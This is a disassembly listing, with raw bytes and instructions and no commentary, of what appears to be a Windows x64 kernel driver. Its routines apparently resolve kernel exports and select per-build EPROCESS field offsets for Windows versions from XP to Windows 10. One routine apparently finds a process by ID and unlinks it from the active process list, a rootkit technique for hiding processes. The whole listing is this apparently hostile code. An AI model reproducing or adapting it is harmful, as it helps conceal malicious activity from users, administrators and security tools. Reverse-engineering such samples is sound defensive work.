   140001e8a:	48 89 1d 3f 45 00 00 	mov    %rbx,0x453f(%rip)        # 0x1400063d0
   140001e91:	ff 15 31 32 00 00    	call   *0x3231(%rip)        # 0x1400050c8
   140001e97:	4c 8d 1d 22 45 00 00 	lea    0x4522(%rip),%r11        # 0x1400063c0
   140001e9e:	66 89 5c 24 30       	mov    %bx,0x30(%rsp)
   140001ea3:	48 8d 0d 56 45 00 00 	lea    0x4556(%rip),%rcx        # 0x140006400
   140001eaa:	45 33 c9             	xor    %r9d,%r9d
   140001ead:	45 33 c0             	xor    %r8d,%r8d
   140001eb0:	33 d2                	xor    %edx,%edx
   140001eb2:	c7 44 24 28 6d 6b 70 	movl   $0x6e706b6d,0x28(%rsp)
   140001eb9:	6e 
   140001eba:	4c 89 1d 07 45 00 00 	mov    %r11,0x4507(%rip)        # 0x1400063c8
   140001ec1:	4c 89 1d f8 44 00 00 	mov    %r11,0x44f8(%rip)        # 0x1400063c0
   140001ec8:	48 c7 44 24 20 48 00 	movq   $0x48,0x20(%rsp)
   140001ecf:	00 00 
   140001ed1:	ff 15 e9 31 00 00    	call   *0x31e9(%rip)        # 0x1400050c0
   140001ed7:	48 8d 05 12 fc ff ff 	lea    -0x3ee(%rip),%rax        # 0x140001af0
   140001ede:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001ee3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001ee8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001eed:	45 33 c9             	xor    %r9d,%r9d
   140001ef0:	45 33 c0             	xor    %r8d,%r8d
   140001ef3:	33 d2                	xor    %edx,%edx
   140001ef5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001efa:	ff 15 d0 31 00 00    	call   *0x31d0(%rip)        # 0x1400050d0
   140001f00:	8b d8                	mov    %eax,%ebx
   140001f02:	85 c0                	test   %eax,%eax
   140001f04:	78 17                	js     0x140001f1d
   140001f06:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001f0b:	ff 15 c7 31 00 00    	call   *0x31c7(%rip)        # 0x1400050d8
   140001f11:	e8 ca fc ff ff       	call   0x140001be0
   140001f16:	e8 d5 fd ff ff       	call   0x140001cf0
   140001f1b:	8b c3                	mov    %ebx,%eax
   140001f1d:	48 83 c4 40          	add    $0x40,%rsp
   140001f21:	5b                   	pop    %rbx
   140001f22:	c3                   	ret
   140001f23:	cc                   	int3
   140001f24:	cc                   	int3
   140001f25:	cc                   	int3
   140001f26:	cc                   	int3
   140001f27:	cc                   	int3
   140001f28:	cc                   	int3
   140001f29:	cc                   	int3
   140001f2a:	cc                   	int3
   140001f2b:	cc                   	int3
   140001f2c:	cc                   	int3
   140001f2d:	cc                   	int3
   140001f2e:	cc                   	int3
   140001f2f:	cc                   	int3
   140001f30:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140001f35:	57                   	push   %rdi
   140001f36:	41 54                	push   %r12
   140001f38:	41 55                	push   %r13
   140001f3a:	48 83 ec 20          	sub    $0x20,%rsp
   140001f3e:	4c 8b ea             	mov    %rdx,%r13
   140001f41:	4c 8b e1             	mov    %rcx,%r12
   140001f44:	33 ed                	xor    %ebp,%ebp
   140001f46:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140001f4b:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001f50:	8d 4d 0b             	lea    0xb(%rbp),%ecx
   140001f53:	45 33 c0             	xor    %r8d,%r8d
   140001f56:	ff 15 8c 31 00 00    	call   *0x318c(%rip)        # 0x1400050e8
   140001f5c:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140001f60:	33 c9                	xor    %ecx,%ecx
   140001f62:	ff 15 88 31 00 00    	call   *0x3188(%rip)        # 0x1400050f0
   140001f68:	48 8b f8             	mov    %rax,%rdi
   140001f6b:	48 85 c0             	test   %rax,%rax
   140001f6e:	74 23                	je     0x140001f93
   140001f70:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140001f75:	8d 4d 0b             	lea    0xb(%rbp),%ecx
   140001f78:	45 33 c9             	xor    %r9d,%r9d
   140001f7b:	48 8b d0             	mov    %rax,%rdx
   140001f7e:	ff 15 64 31 00 00    	call   *0x3164(%rip)        # 0x1400050e8
   140001f84:	85 c0                	test   %eax,%eax
   140001f86:	79 1c                	jns    0x140001fa4
   140001f88:	33 d2                	xor    %edx,%edx
   140001f8a:	48 8b cf             	mov    %rdi,%rcx
   140001f8d:	ff 15 65 31 00 00    	call   *0x3165(%rip)        # 0x1400050f8
   140001f93:	33 c0                	xor    %eax,%eax
   140001f95:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140001f9a:	48 83 c4 20          	add    $0x20,%rsp
   140001f9e:	41 5d                	pop    %r13
   140001fa0:	41 5c                	pop    %r12
   140001fa2:	5f                   	pop    %rdi
   140001fa3:	c3                   	ret
   140001fa4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001fa9:	8b dd                	mov    %ebp,%ebx
   140001fab:	39 1f                	cmp    %ebx,(%rdi)
   140001fad:	76 5b                	jbe    0x14000200a
   140001faf:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140001fb4:	48 8d 77 2e          	lea    0x2e(%rdi),%rsi
   140001fb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001fbf:	00 
   140001fc0:	0f b7 0e             	movzwl (%rsi),%ecx
   140001fc3:	8b c3                	mov    %ebx,%eax
   140001fc5:	49 8b d4             	mov    %r12,%rdx
   140001fc8:	48 69 c0 28 01 00 00 	imul   $0x128,%rax,%rax
   140001fcf:	48 03 c7             	add    %rdi,%rax
   140001fd2:	48 8d 4c 01 30       	lea    0x30(%rcx,%rax,1),%rcx
   140001fd7:	e8 38 2e 00 00       	call   0x140004e14
   140001fdc:	85 c0                	test   %eax,%eax
   140001fde:	74 0f                	je     0x140001fef
   140001fe0:	ff c3                	inc    %ebx
   140001fe2:	48 81 c6 28 01 00 00 	add    $0x128,%rsi
   140001fe9:	3b 1f                	cmp    (%rdi),%ebx
   140001feb:	72 d3                	jb     0x140001fc0
   140001fed:	eb 16                	jmp    0x140002005
   140001fef:	8b cb                	mov    %ebx,%ecx
   140001ff1:	48 69 c9 28 01 00 00 	imul   $0x128,%rcx,%rcx
   140001ff8:	48 8b 6c 39 18       	mov    0x18(%rcx,%rdi,1),%rbp
   140001ffd:	8b 4c 39 20          	mov    0x20(%rcx,%rdi,1),%ecx
   140002001:	41 89 4d 00          	mov    %ecx,0x0(%r13)
   140002005:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000200a:	33 d2                	xor    %edx,%edx
   14000200c:	48 8b cf             	mov    %rdi,%rcx
   14000200f:	ff 15 e3 30 00 00    	call   *0x30e3(%rip)        # 0x1400050f8
   140002015:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000201a:	48 8b c5             	mov    %rbp,%rax
   14000201d:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002022:	48 83 c4 20          	add    $0x20,%rsp
   140002026:	41 5d                	pop    %r13
   140002028:	41 5c                	pop    %r12
   14000202a:	5f                   	pop    %rdi
   14000202b:	c3                   	ret
   14000202c:	cc                   	int3
   14000202d:	cc                   	int3
   14000202e:	cc                   	int3
   14000202f:	cc                   	int3
   140002030:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002035:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000203a:	56                   	push   %rsi
   14000203b:	57                   	push   %rdi
   14000203c:	41 54                	push   %r12
   14000203e:	48 83 ec 20          	sub    $0x20,%rsp
   140002042:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002046:	33 db                	xor    %ebx,%ebx
   140002048:	4c 8b e1             	mov    %rcx,%r12
   14000204b:	8b bc 08 88 00 00 00 	mov    0x88(%rax,%rcx,1),%edi
   140002052:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   140002056:	48 03 f9             	add    %rcx,%rdi
   140002059:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   14000205c:	76 4e                	jbe    0x1400020ac
   14000205e:	48 8b f3             	mov    %rbx,%rsi
   140002061:	48 8b eb             	mov    %rbx,%rbp
   140002064:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000206b:	00 00 00 00 00 
   140002070:	8b 47 20             	mov    0x20(%rdi),%eax
   140002073:	48 8d 15 1e 33 00 00 	lea    0x331e(%rip),%rdx        # 0x140005398
   14000207a:	48 03 c5             	add    %rbp,%rax
   14000207d:	42 8b 0c 20          	mov    (%rax,%r12,1),%ecx
   140002081:	8b 47 24             	mov    0x24(%rdi),%eax
   140002084:	48 03 c6             	add    %rsi,%rax
   140002087:	49 03 cc             	add    %r12,%rcx
   14000208a:	42 0f b7 04 20       	movzwl (%rax,%r12,1),%eax
   14000208f:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   140002094:	e8 7b 2d 00 00       	call   0x140004e14
   140002099:	85 c0                	test   %eax,%eax
   14000209b:	74 24                	je     0x1400020c1
   14000209d:	ff c3                	inc    %ebx
   14000209f:	48 83 c5 04          	add    $0x4,%rbp
   1400020a3:	48 83 c6 02          	add    $0x2,%rsi
   1400020a7:	3b 5f 18             	cmp    0x18(%rdi),%ebx
   1400020aa:	72 c4                	jb     0x140002070
   1400020ac:	33 c0                	xor    %eax,%eax
   1400020ae:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400020b3:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1400020b8:	48 83 c4 20          	add    $0x20,%rsp
   1400020bc:	41 5c                	pop    %r12
   1400020be:	5f                   	pop    %rdi
   1400020bf:	5e                   	pop    %rsi
   1400020c0:	c3                   	ret
   1400020c1:	8b 4f 1c             	mov    0x1c(%rdi),%ecx
   1400020c4:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1400020c8:	8d 0c 81             	lea    (%rcx,%rax,4),%ecx
   1400020cb:	42 8b 04 21          	mov    (%rcx,%r12,1),%eax
   1400020cf:	49 03 c4             	add    %r12,%rax
   1400020d2:	eb da                	jmp    0x1400020ae
   1400020d4:	cc                   	int3
   1400020d5:	cc                   	int3
   1400020d6:	cc                   	int3
   1400020d7:	cc                   	int3
   1400020d8:	cc                   	int3
   1400020d9:	cc                   	int3
   1400020da:	cc                   	int3
   1400020db:	cc                   	int3
   1400020dc:	cc                   	int3
   1400020dd:	cc                   	int3
   1400020de:	cc                   	int3
   1400020df:	cc                   	int3
   1400020e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400020ea:	57                   	push   %rdi
   1400020eb:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   1400020f2:	33 c0                	xor    %eax,%eax
   1400020f4:	48 8b d9             	mov    %rcx,%rbx
   1400020f7:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   1400020fc:	33 f6                	xor    %esi,%esi
   1400020fe:	33 d2                	xor    %edx,%edx
   140002100:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   140002106:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   14000210b:	48 89 44 24 22       	mov    %rax,0x22(%rsp)
   140002110:	89 44 24 2a          	mov    %eax,0x2a(%rsp)
   140002114:	66 89 74 24 20       	mov    %si,0x20(%rsp)
   140002119:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   14000211e:	c7 44 24 30 1c 01 00 	movl   $0x11c,0x30(%rsp)
   140002125:	00 
   140002126:	e8 05 2d 00 00       	call   0x140004e30
   14000212b:	48 8d 15 de 36 00 00 	lea    0x36de(%rip),%rdx        # 0x140005810
   140002132:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002137:	ff 15 c3 2e 00 00    	call   *0x2ec3(%rip)        # 0x140005000
   14000213d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002142:	ff 15 60 30 00 00    	call   *0x3060(%rip)        # 0x1400051a8
   140002148:	48 85 c0             	test   %rax,%rax
   14000214b:	74 1b                	je     0x140002168
   14000214d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002152:	ff d0                	call   *%rax
   140002154:	8b f8                	mov    %eax,%edi
   140002156:	85 c0                	test   %eax,%eax
   140002158:	78 3a                	js     0x140002194
   14000215a:	8b 54 24 3c          	mov    0x3c(%rsp),%edx
   14000215e:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   140002162:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140002166:	eb 41                	jmp    0x1400021a9
   140002168:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   14000216d:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140002172:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   140002177:	45 33 c9             	xor    %r9d,%r9d
   14000217a:	ff 15 30 30 00 00    	call   *0x3030(%rip)        # 0x1400051b0
   140002180:	84 c0                	test   %al,%al
   140002182:	74 10                	je     0x140002194
   140002184:	8b 54 24 3c          	mov    0x3c(%rsp),%edx
   140002188:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   14000218c:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140002190:	8b fe                	mov    %esi,%edi
   140002192:	eb 15                	jmp    0x1400021a9
   140002194:	8b 84 24 68 01 00 00 	mov    0x168(%rsp),%eax
   14000219b:	8b 8c 24 68 01 00 00 	mov    0x168(%rsp),%ecx
   1400021a2:	8b 94 24 68 01 00 00 	mov    0x168(%rsp),%edx
   1400021a9:	85 ff                	test   %edi,%edi
   1400021ab:	78 17                	js     0x1400021c4
   1400021ad:	81 fa 28 0a 00 00    	cmp    $0xa28,%edx
   1400021b3:	75 26                	jne    0x1400021db
   1400021b5:	83 f9 05             	cmp    $0x5,%ecx
   1400021b8:	75 05                	jne    0x1400021bf
   1400021ba:	83 f8 01             	cmp    $0x1,%eax
   1400021bd:	74 05                	je     0x1400021c4
   1400021bf:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   1400021c4:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   1400021cb:	00 
   1400021cc:	8b c7                	mov    %edi,%eax
   1400021ce:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400021d2:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400021d6:	49 8b e3             	mov    %r11,%rsp
   1400021d9:	5f                   	pop    %rdi
   1400021da:	c3                   	ret
   1400021db:	81 fa ce 0e 00 00    	cmp    $0xece,%edx
   1400021e1:	75 2e                	jne    0x140002211
   1400021e3:	83 f9 05             	cmp    $0x5,%ecx
   1400021e6:	75 d7                	jne    0x1400021bf
   1400021e8:	83 f8 02             	cmp    $0x2,%eax
   1400021eb:	75 d2                	jne    0x1400021bf
   1400021ed:	c7 03 d8 00 00 00    	movl   $0xd8,(%rbx)
   1400021f3:	c7 43 04 e0 00 00 00 	movl   $0xe0,0x4(%rbx)
   1400021fa:	c7 43 08 68 02 00 00 	movl   $0x268,0x8(%rbx)
   140002201:	c7 43 0c 18 03 00 00 	movl   $0x318,0xc(%rbx)
   140002208:	c7 43 10 f0 01 00 00 	movl   $0x1f0,0x10(%rbx)
   14000220f:	eb b3                	jmp    0x1400021c4
   140002211:	81 fa 70 17 00 00    	cmp    $0x1770,%edx
   140002217:	74 10                	je     0x140002229
   140002219:	81 fa 71 17 00 00    	cmp    $0x1771,%edx
   14000221f:	74 08                	je     0x140002229
   140002221:	81 fa 72 17 00 00    	cmp    $0x1772,%edx
   140002227:	75 30                	jne    0x140002259
   140002229:	83 f9 06             	cmp    $0x6,%ecx
   14000222c:	75 91                	jne    0x1400021bf
   14000222e:	85 c0                	test   %eax,%eax
   140002230:	75 8d                	jne    0x1400021bf
   140002232:	c7 03 e0 00 00 00    	movl   $0xe0,(%rbx)
   140002238:	c7 43 04 e8 00 00 00 	movl   $0xe8,0x4(%rbx)
   14000223f:	c7 43 08 38 02 00 00 	movl   $0x238,0x8(%rbx)
   140002246:	c7 43 0c e8 02 00 00 	movl   $0x2e8,0xc(%rbx)
   14000224d:	c7 43 10 c8 01 00 00 	movl   $0x1c8,0x10(%rbx)
   140002254:	e9 6b ff ff ff       	jmp    0x1400021c4
   140002259:	81 fa b0 1d 00 00    	cmp    $0x1db0,%edx
   14000225f:	74 08                	je     0x140002269
   140002261:	81 fa b1 1d 00 00    	cmp    $0x1db1,%edx
   140002267:	75 39                	jne    0x1400022a2
   140002269:	83 f9 06             	cmp    $0x6,%ecx
   14000226c:	0f 85 4d ff ff ff    	jne    0x1400021bf
   140002272:	83 f8 01             	cmp    $0x1,%eax
   140002275:	0f 85 44 ff ff ff    	jne    0x1400021bf
   14000227b:	c7 03 80 01 00 00    	movl   $0x180,(%rbx)
   140002281:	c7 43 04 88 01 00 00 	movl   $0x188,0x4(%rbx)
   140002288:	c7 43 08 e0 02 00 00 	movl   $0x2e0,0x8(%rbx)
   14000228f:	c7 43 0c 90 03 00 00 	movl   $0x390,0xc(%rbx)
   140002296:	c7 43 10 68 02 00 00 	movl   $0x268,0x10(%rbx)
   14000229d:	e9 22 ff ff ff       	jmp    0x1400021c4
   1400022a2:	81 fa f0 23 00 00    	cmp    $0x23f0,%edx
   1400022a8:	75 0e                	jne    0x1400022b8
   1400022aa:	83 f9 06             	cmp    $0x6,%ecx
   1400022ad:	0f 85 0c ff ff ff    	jne    0x1400021bf
   1400022b3:	83 f8 02             	cmp    $0x2,%eax
   1400022b6:	eb 14                	jmp    0x1400022cc
   1400022b8:	81 fa 80 25 00 00    	cmp    $0x2580,%edx
   1400022be:	75 39                	jne    0x1400022f9
   1400022c0:	83 f9 06             	cmp    $0x6,%ecx
   1400022c3:	0f 85 f6 fe ff ff    	jne    0x1400021bf
   1400022c9:	83 f8 03             	cmp    $0x3,%eax
   1400022cc:	0f 85 ed fe ff ff    	jne    0x1400021bf
   1400022d2:	c7 03 e0 02 00 00    	movl   $0x2e0,(%rbx)
   1400022d8:	c7 43 04 e8 02 00 00 	movl   $0x2e8,0x4(%rbx)
   1400022df:	c7 43 08 38 04 00 00 	movl   $0x438,0x8(%rbx)
   1400022e6:	c7 43 0c 50 04 00 00 	movl   $0x450,0xc(%rbx)
   1400022ed:	c7 43 10 a8 03 00 00 	movl   $0x3a8,0x10(%rbx)
   1400022f4:	e9 cb fe ff ff       	jmp    0x1400021c4
   1400022f9:	81 fa 84 26 00 00    	cmp    $0x2684,%edx
   1400022ff:	75 11                	jne    0x140002312
   140002301:	83 f9 06             	cmp    $0x6,%ecx
   140002304:	0f 85 b5 fe ff ff    	jne    0x1400021bf
   14000230a:	83 f8 04             	cmp    $0x4,%eax
   14000230d:	e9 ab fe ff ff       	jmp    0x1400021bd
   140002312:	81 fa 5a 27 00 00    	cmp    $0x275a,%edx
   140002318:	74 08                	je     0x140002322
   14000231a:	81 fa 00 28 00 00    	cmp    $0x2800,%edx
   140002320:	75 38                	jne    0x14000235a
   140002322:	83 f9 0a             	cmp    $0xa,%ecx
   140002325:	0f 85 94 fe ff ff    	jne    0x1400021bf
   14000232b:	85 c0                	test   %eax,%eax
   14000232d:	0f 85 8c fe ff ff    	jne    0x1400021bf
   140002333:	c7 03 e8 02 00 00    	movl   $0x2e8,(%rbx)
   140002339:	c7 43 04 f0 02 00 00 	movl   $0x2f0,0x4(%rbx)
   140002340:	c7 43 08 48 04 00 00 	movl   $0x448,0x8(%rbx)
   140002347:	c7 43 0c 60 04 00 00 	movl   $0x460,0xc(%rbx)
   14000234e:	c7 43 10 b8 03 00 00 	movl   $0x3b8,0x10(%rbx)
   140002355:	e9 6a fe ff ff       	jmp    0x1400021c4
   14000235a:	81 fa 5a 29 00 00    	cmp    $0x295a,%edx
   140002360:	74 14                	je     0x140002376
   140002362:	81 fa d7 37 00 00    	cmp    $0x37d7,%edx
   140002368:	74 0c                	je     0x140002376
   14000236a:	81 fa 39 38 00 00    	cmp    $0x3839,%edx
   140002370:	0f 85 49 fe ff ff    	jne    0x1400021bf
   140002376:	83 f9 0a             	cmp    $0xa,%ecx
   140002379:	0f 85 40 fe ff ff    	jne    0x1400021bf
   14000237f:	85 c0                	test   %eax,%eax
   140002381:	0f 85 38 fe ff ff    	jne    0x1400021bf
   140002387:	c7 03 e8 02 00 00    	movl   $0x2e8,(%rbx)
   14000238d:	c7 43 04 f0 02 00 00 	movl   $0x2f0,0x4(%rbx)
   140002394:	c7 43 08 50 04 00 00 	movl   $0x450,0x8(%rbx)
   14000239b:	c7 43 0c 68 04 00 00 	movl   $0x468,0xc(%rbx)
   1400023a2:	c7 43 10 b8 03 00 00 	movl   $0x3b8,0x10(%rbx)
   1400023a9:	e9 16 fe ff ff       	jmp    0x1400021c4
   1400023ae:	cc                   	int3
   1400023af:	cc                   	int3
   1400023b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400023b5:	57                   	push   %rdi
   1400023b6:	48 83 ec 40          	sub    $0x40,%rsp
   1400023ba:	33 c0                	xor    %eax,%eax
   1400023bc:	8b f9                	mov    %ecx,%edi
   1400023be:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400023c3:	bb 01 00 00 c0       	mov    $0xc0000001,%ebx
   1400023c8:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400023cc:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1400023d0:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400023d4:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   1400023d8:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400023dc:	e8 ff fc ff ff       	call   0x1400020e0
   1400023e1:	85 c0                	test   %eax,%eax
   1400023e3:	78 67                	js     0x14000244c
   1400023e5:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1400023ea:	8b 74 24 24          	mov    0x24(%rsp),%esi
   1400023ee:	ff 15 ec 2c 00 00    	call   *0x2cec(%rip)        # 0x1400050e0
   1400023f4:	48 03 c6             	add    %rsi,%rax
   1400023f7:	48 8b d0             	mov    %rax,%rdx
   1400023fa:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400023fe:	75 07                	jne    0x140002407
   140002400:	48 83 78 08 00       	cmpq   $0x0,0x8(%rax)
   140002405:	74 40                	je     0x140002447
   140002407:	8b 4c 24 20          	mov    0x20(%rsp),%ecx
   14000240b:	48 2b ce             	sub    %rsi,%rcx
   14000240e:	66 90                	xchg   %ax,%ax
   140002410:	39 3c 11             	cmp    %edi,(%rcx,%rdx,1)
   140002413:	74 1b                	je     0x140002430
   140002415:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140002419:	48 3b d0             	cmp    %rax,%rdx
   14000241c:	75 f2                	jne    0x140002410
   14000241e:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002423:	8b c3                	mov    %ebx,%eax
   140002425:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000242a:	48 83 c4 40          	add    $0x40,%rsp
   14000242e:	5f                   	pop    %rdi
   14000242f:	c3                   	ret
   140002430:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   140002434:	48 8b 02             	mov    (%rdx),%rax
   140002437:	33 db                	xor    %ebx,%ebx
   140002439:	48 89 01             	mov    %rax,(%rcx)
   14000243c:	48 8b 0a             	mov    (%rdx),%rcx
   14000243f:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140002443:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002447:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000244c:	8b c3                	mov    %ebx,%eax
   14000244e:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002453:	48 83 c4 40          	add    $0x40,%rsp
   140002457:	5f                   	pop    %rdi
   140002458:	c3                   	ret
   140002459:	cc                   	int3
   14000245a:	cc                   	int3
   14000245b:	cc                   	int3
   14000245c:	cc                   	int3
   14000245d:	cc                   	int3
   14000245e:	cc                   	int3
   14000245f:	cc                   	int3
   140002460:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002465:	57                   	push   %rdi
   140002466:	48 83 ec 40          	sub    $0x40,%rsp
   14000246a:	33 c0                	xor    %eax,%eax
   14000246c:	8b f9                	mov    %ecx,%edi
   14000246e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002473:	48 8b f2             	mov    %rdx,%rsi
   140002476:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000247a:	89 44 24 24          	mov    %eax,0x24(%rsp)
   14000247e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002482:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140002486:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000248a:	e8 51 fc ff ff       	call   0x1400020e0
   14000248f:	85 c0                	test   %eax,%eax
   140002491:	0f 88 89 00 00 00    	js     0x140002520
   140002497:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000249c:	8b 5c 24 24          	mov    0x24(%rsp),%ebx
   1400024a0:	ff 15 3a 2c 00 00    	call   *0x2c3a(%rip)        # 0x1400050e0
   1400024a6:	48 03 c3             	add    %rbx,%rax
   1400024a9:	4c 8b c0             	mov    %rax,%r8
   1400024ac:	48 39 40 08          	cmp    %rax,0x8(%rax)
   1400024b0:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400024b4:	74 20                	je     0x1400024d6
   1400024b6:	8b 54 24 20          	mov    0x20(%rsp),%edx
   1400024ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400024c0:	4c 2b c3             	sub    %rbx,%r8
   1400024c3:	42 39 3c 02          	cmp    %edi,(%rdx,%r8,1)
   1400024c7:	74 22                	je     0x1400024eb
   1400024c9:	4c 8b 01             	mov    (%rcx),%r8
   1400024cc:	49 39 40 08          	cmp    %rax,0x8(%r8)
   1400024d0:	49 8d 48 08          	lea    0x8(%r8),%rcx
   1400024d4:	75 ea                	jne    0x1400024c0
   1400024d6:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400024db:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400024e0:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400024e5:	48 83 c4 40          	add    $0x40,%rsp
   1400024e9:	5f                   	pop    %rdi
   1400024ea:	c3                   	ret
   1400024eb:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1400024ef:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   1400024f3:	48 2b d0             	sub    %rax,%rdx
   1400024f6:	4a 8d 0c 00          	lea    (%rax,%r8,1),%rcx
   1400024fa:	49 2b d0             	sub    %r8,%rdx
   1400024fd:	0f 1f 00             	nopl   (%rax)
   140002500:	0f b6 01             	movzbl (%rcx),%eax
   140002503:	48 ff c1             	inc    %rcx
   140002506:	88 44 0a ff          	mov    %al,-0x1(%rdx,%rcx,1)
   14000250a:	84 c0                	test   %al,%al
   14000250c:	75 f2                	jne    0x140002500
   14000250e:	33 c0                	xor    %eax,%eax
   140002510:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002515:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000251a:	48 83 c4 40          	add    $0x40,%rsp
   14000251e:	5f                   	pop    %rdi
   14000251f:	c3                   	ret
   140002520:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140002525:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000252a:	48 83 c4 40          	add    $0x40,%rsp
   14000252e:	5f                   	pop    %rdi
   14000252f:	c3                   	ret
   140002530:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002535:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000253a:	57                   	push   %rdi
   14000253b:	48 83 ec 40          	sub    $0x40,%rsp
   14000253f:	33 c0                	xor    %eax,%eax
   140002541:	48 8b f1             	mov    %rcx,%rsi
   140002544:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002549:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000254d:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140002551:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002555:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140002559:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000255d:	e8 7e fb ff ff       	call   0x1400020e0
   140002562:	85 c0                	test   %eax,%eax
   140002564:	78 36                	js     0x14000259c
   140002566:	8b 1e                	mov    (%rsi),%ebx
   140002568:	8b 7c 24 24          	mov    0x24(%rsp),%edi
   14000256c:	ff 15 6e 2b 00 00    	call   *0x2b6e(%rip)        # 0x1400050e0
   140002572:	48 03 c7             	add    %rdi,%rax
   140002575:	4c 8b c0             	mov    %rax,%r8
   140002578:	48 39 40 08          	cmp    %rax,0x8(%rax)
   14000257c:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002580:	74 1a                	je     0x14000259c
   140002582:	8b 54 24 20          	mov    0x20(%rsp),%edx
   140002586:	4c 2b c7             	sub    %rdi,%r8
   140002589:	42 39 1c 02          	cmp    %ebx,(%rdx,%r8,1)
   14000258d:	74 22                	je     0x1400025b1
   14000258f:	4c 8b 01             	mov    (%rcx),%r8
   140002592:	49 39 40 08          	cmp    %rax,0x8(%r8)
   140002596:	49 8d 48 08          	lea    0x8(%r8),%rcx
   14000259a:	75 ea                	jne    0x140002586
   14000259c:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400025a1:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400025a6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400025ab:	48 83 c4 40          	add    $0x40,%rsp
   1400025af:	5f                   	pop    %rdi
